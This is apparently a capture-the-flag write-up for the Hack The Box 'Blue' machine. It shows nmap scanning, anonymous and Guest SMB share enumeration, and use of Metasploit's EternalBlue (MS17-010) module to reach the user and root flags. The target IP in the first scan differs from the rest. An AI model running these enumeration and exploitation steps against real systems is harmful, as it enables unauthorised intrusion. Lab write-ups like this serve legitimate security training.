# -HTB-Blue

### Start with a nmap scan
```
nmap -sVC -p- 10.10.10.95 -oN nmap_scan --min-rate 5000
```
> - `-sVC`: Detect service/version /// Run default scripts
> - `-oN`: Output to file (normal format)
> - `--min-rate 5000`: Fast scan 5000 p/s


<img width="917" height="694" alt="image" src="https://github.com/user-attachments/assets/fbfe642a-ecf9-467d-8296-a4db89ac7e44" />


### We see the smb it s open so we use nxc and try anonymus loggin:
```
nxc smb 10.10.10.40 -u "" -p "" 
```
<img width="1355" height="78" alt="image" src="https://github.com/user-attachments/assets/fdd80c02-c259-4e0d-9128-1afaa00c0709" />


### I use --shares to enumereate the shares as the Guest account  :
```
nxc smb 10.10.10.40 -u "Guest" -p "" --shares
```


<img width="1324" height="209" alt="image" src="https://github.com/user-attachments/assets/627ea548-6da3-4e8a-9969-42103bd03a17" />

### After i use smbclient to connect to the smb with -N ( no pass ) 
```
smbclient //10.10.10.40/Users -N
```
<img width="690" height="178" alt="image" src="https://github.com/user-attachments/assets/b2dbbb4f-20a9-42a9-82cc-1370d02cff97" />

### After allot of file ... i got back to the nmap scan and search on google : "Windows 7 Professional 6.1 exploit smb" .And find that has an remote code execution on the smb name as : EternalBlue Exploit | MS17-010  // And matasplot has an exploit we can use 

<img width="1383" height="784" alt="image" src="https://github.com/user-attachments/assets/35a7faba-30d7-4ca0-b6f1-65cc8e18053a" />

- set lhost <YOUR $IP>
- set rhost 10.10.10.40

<img width="181" height="47" alt="image" src="https://github.com/user-attachments/assets/a3d4c8cd-f61c-4c3c-9fc1-a7306732dc2d" />

### And we find the users in flag :
```
C:\Users\haris\Desktop
```

<img width="569" height="163" alt="image" src="https://github.com/user-attachments/assets/5c92b9ca-6967-4dfd-bb70-d971d67e7ac7" />


### And the root in flag:
```
C:\Users\Administrator\Desktop
```
<img width="564" height="165" alt="image" src="https://github.com/user-attachments/assets/229c097e-9d7d-450c-a4c9-98e1bb5f635e" />
